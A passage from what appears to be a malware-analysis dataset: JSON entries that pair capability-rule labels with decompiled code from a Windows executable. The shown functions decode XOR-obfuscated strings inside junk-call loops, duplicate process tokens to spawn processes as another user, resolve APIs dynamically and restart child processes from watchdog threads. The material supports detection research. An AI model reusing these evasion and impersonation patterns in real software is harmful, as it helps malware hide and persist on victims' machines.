       cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.0040bfd5();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 639
    },
    "004056e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004056e6(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpCommandLine;\n    uint var_9ch;\n    uint *var_58h;\n    int32_t var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uchar var_40h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_4h;\n    \n    var_4ch = 0x363b4847;\n    iVar5 = 0x44;\n    var_48h = 0x683b6228;\n    puVar6 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_44h = 0x48075142;\n    var_3fh = 0x27620336;\n    puVar6 = &var_9ch;\n    var_58h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_9ch = 0x44;\n    var_3bh = 0x16515968;\n    puVar6 = &lpCommandLine;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_54h = 5;\n    var_40h = 5;\n    var_37h = 0xd364d48;\n    var_33h = 0x4f683b62;\n    var_2fh = 0x1c481151;\n    var_2bh = 0x25623436;\n    var_27h._0_1_ = 0x68;\n    stack0xffffffd7 = 0x34485051;\n    var_21h = 0x3e622236;\n    var_1dh = 0xa515568;\n    var_19h = 0x22360748;\n    var_15h = 0x18683c62;\n    var_11h = 0x10480751;\n    var_dh = 0x48623436;\n    var_9h._0_1_ = 0x68;\n    stack0xfffffff4 = 0x36684862;\n    var_4h._0_1_ = 0x51;\n    var_27h._1_1_ = var_40h;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x89);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar2 != 0xae5969) {\n            *(iVar5 + iVar4) = *(&var_9h + iVar5 % var_54h + 1) ^ (iVar5 + iVar4)[&var_4ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpCommandLine, 0x104);\n    puVar6 = var_58h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_9ch, var_58h);\n    if (puVar6[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar6[1]);\n    }\n    uVar1 = *puVar6;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 1069
    },
    "00405855": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405855(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t uStack564;\n    int32_t iStack552;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack576 = 0;\n    iStack580 = 0;\n    puVar10 = auStack544;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar11 = &uStack568;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    piVar9 = &iStack528;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    if (*0x41dad4 == 0) {\n        *0x41db10 = fcn.004056e6();\n        uVar6 = *0x41dd24;\n        iVar8 = *0x41dd20;\n    }\n    else {\n        *0x41db10 = fcn.00408176();\n        iVar5 = fcn.0040c4bf(&iStack580);\n        uVar6 = uStack576;\n        iVar8 = iStack580;\n        if (iVar5 != 0) goto code_r0x0040590e;\n    }\n    uStack564 = uVar6 >> 0x1f;\n    uStack568 = uVar6;\n    iStack552 = iVar8;\ncode_r0x0040590e:\n    iVar8 = iStack552;\n    uVar3 = uStack564;\n    uVar6 = uStack568;\n    if (*0x41db10 == 0) {\n        piVar9 = &iStack528;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        if (piVar9 - auStack526 >> 1 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar4);\n        }\n    }\n    else {\n        fcn.00405a39();\n        if ((iVar8 != 0) && ((uVar6 | uVar3) != 0)) {\n            fcn.0040c008();\n            fcn.0040307c((*0x41dadc & 1) << 4);\n        }\n        uStack576 = *0x41db10;\n        uStack572 = *0x41dae0;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack576, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41db10, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00405855, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n        (*pcVar2)(*0x41db10);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 954
    },
    "00405c89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405c89(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_328h;\n    uint var_120h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar9 = &var_120h;\n    for (iVar7 = 0x104; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_328h;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    if (*0x41dad4 == 0) {\n        uVar6 = 0;\n        do {\n            if (*(uVar6 + 0x4118f0) == arg_ch) {\n                if (arg_10h == *0x41dad0) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar9 = &var_120h;\n                    for (iVar7 = 0x104; iVar7 != 0; iVar7 = iVar7 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    var_120h._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar7 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar7 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar7, &var_120h, 0x104);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n                    }\n                    pcVar5 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_120h);\n                    if (iVar7 != 0) {\n                        (*pcVar5)(&var_120h);\n                        iVar7 = fcn.0040480b();\n                        if (iVar7 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar7 = fcn.004059e5();\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                puVar9 = &var_328h;\n                for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                iVar7 = fcn.00405a39();\n                if (iVar7 == 0) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_328h, 0x41db18);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004060b4, arg_10h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                return 1;\n            }\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x1c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar7 = fcn.004059e5(),  iVar7 == 0)) && (iVar7 = fcn.00405a39(),  iVar7 != 0)\n             ) && (iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_328h),  iVar1 == 0)) {\n        var_18h = 0x2a18513a;\n        var_14h = 0x58073d54;\n        var_10h = 0x583d556a;\n        var_ch._0_1_ = 0x6a;\n        var_8h = 0x446a3451;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x31);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        var_1ch = iVar7;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            if (iVar3 != 0x3644e2) {\n                *(iVar8 + iVar7) = *(&var_8h + iVar8 % 5) ^ (iVar8 + iVar7)[&var_18h - iVar7];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0xd);\n        var_14h = 0x40b3613;\n        var_10h = 0x53f0a36;\n        var_ch._0_1_ = 0x6f;\n        var_8h = 0x456f5252;\n        var_4h._0_2_ = 0x6542;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            iVar3 = var_1ch;\n            if (iVar4 != 0xa7aceb) {\n                *(iVar8 + iVar7) = *(&var_8h + iVar8 % 6) ^ (iVar8 + iVar7)[&var_14h - iVar7];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 9);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_1ch, iVar7);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        (*pcVar5)(&var_328h);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *(iVar8 + 8) = arg_10h;\n        uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408070, iVar8, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*pcVar5)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1739
    },
    "00407d4e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00407d4e(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, L\"%s --\", *0x41dacc);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 361
    },
    "00407dcb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00407dcb(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint lpApplicationName;\n    uint lpCommandLine;\n    int32_t var_a8h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    uint var_60h;\n    int32_t *var_5ch;\n    uint var_58h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    uint var_4ch;\n    uint pSessionId;\n    int32_t var_44h;\n    uint hExistingToken;\n    uint pSid;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pIdentifierAuthority;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint hToken;\n    \n    var_14h._0_2_ = 0x1000;\n    piVar6 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    puVar7 = &lpCommandLine;\n    var_5ch = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    pSessionId = 0;\n    puVar7 = &var_64h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_4ch = 0;\n    hToken = 0;\n    hExistingToken = 0;\n    var_8h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (ProcessHandle != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar4 != 0) {\n                fcn.004066ce();\n                iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar4 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar5 = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_60h = 0x20;\n                        var_64h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_64h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_8h, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_4ch = 0x400;\n                    }\n                    lpCommandLine = 0x44;\n                    var_38h = 0x74317a32;\n                    var_34h = 0x5809455c;\n                    var_30h = 0x7a243200;\n                    var_2ch = 0x456e7468;\n                    var_28h = 0x3211581e;\n                    var_24h = 0x74397a23;\n                    var_20h = 0x58164547;\n                    var_1ch = 0x7a453200;\n                    var_10h = 0x74587a45;\n                    var_ch._0_1_ = 0x32;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_44h = &var_38h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                        if (iVar3 != 0xd1e4e8) {\n                            var_44h = 5;\n                            *(iVar5 + iVar4) = *(&var_10h + iVar5 % 5) ^ (iVar5 + iVar4)[&var_38h - iVar4];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0x20);\n                    var_80h._0_2_ = 0;\n                    var_84h = 1;\n                    var_a8h = iVar4;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, L\"%s --\", *0x41dacc);\n                    param_2 = var_5ch;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_4ch, var_8h, 0, &lpCommandLine, var_5ch);\n                    pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*param_2 != 0) {\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*param_2, 0x201eb, &TokenHandle);\n                        if (iVar5 != 0) {\n                            fcn.004066ce();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(param_2[1]);\n                    }\n                    if (var_8h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_8h);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n    }\n    return *param_2;\n}\n",
        "token_count": 1714
    },
    "00408070": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408070(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41dad4 == 0) {\n        puStack572 = 0x4080b7;\n        *0x41db10 = fcn.00407d4e();\n    }\n    else {\n        puStack572 = 0x4080ac;\n        *0x41db10 = fcn.00407dcb();\n    }\n    if (*0x41db10 == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x4080cb;\n        fcn.00405a39();\n        iStack552 = *0x41db10;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41dae0;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41db10, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41db10, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408070, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41db10);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 725
    },
    "00408176": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00408176(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint lpCommandLine;\n    int32_t var_b0h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint TokenHandle;\n    uint var_50h;\n    uint pSessionId;\n    uint hExistingToken;\n    int32_t *var_44h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hToken;\n    uint var_8h;\n    uint var_4h;\n    \n    var_50h = 4;\n    var_38h._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &lpCommandLine;\n    var_44h = param_2;\n    for (iVar6 = 0x44; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hToken = 0;\n    puVar9 = &var_6ch;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hExistingToken = 0;\n    var_30h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar6 != 0) {\n        var_64h = iVar6;\n        iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar6, 0x201eb, &hExistingToken);\n            if (iVar2 != 0) {\n                fcn.004066ce();\n                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar2 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar6 != 0) {\n                        var_68h = 0x20;\n                        var_6ch = pSid;\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_6ch, iVar6 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar6 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_30h, hToken, 1);\n                    if (iVar6 == 0) {\n                        var_30h = 0;\n                    }\n                    else {\n                        var_50h = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_2ch = 0x74317a32;\n                    var_28h = 0x5809455c;\n                    var_24h = 0x7a243200;\n                    var_20h = 0x456e7468;\n                    var_1ch = 0x3211581e;\n                    var_18h = 0x74397a23;\n                    var_14h = 0x58164547;\n                    var_10h = 0x7a453200;\n                    var_8h = 0x74587a45;\n                    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x32);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_34h = &var_2ch - iVar6;\n                    var_60h = iVar6;\n                    do {\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                        if (iVar4 != 0xd1e4e8) {\n                            var_5ch = 5;\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % 5) ^ (iVar2 + iVar6)[var_34h];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x20);\n                    var_24h = 0x48114435;\n                    var_20h = 0x442e3730;\n                    var_1ch = 0x37204808;\n                    var_18h = 0x48494432;\n                    var_14h = 0x443e3736;\n                    var_10h = 0x37534802;\n                    var_8h = 0x48674446;\n                    var_4h._0_2_ = 0x3753;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_34h = &var_24h - iVar6;\n                    do {\n                        iVar5 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                        piVar8 = var_44h;\n                        iVar4 = var_60h;\n                        if (iVar5 != 0x11b798) {\n                            var_34h = 6;\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % 6) ^ (iVar2 + iVar6)[&var_24h - iVar6];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x18);\n                    var_88h._0_2_ = 0;\n                    var_b0h = var_60h;\n                    var_8ch = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, iVar6, 0, 0, 0, 0, var_50h, var_30h, 0, &lpCommandLine, var_44h);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*piVar8 != 0) {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*piVar8, 0x201eb, &TokenHandle);\n                        if (iVar2 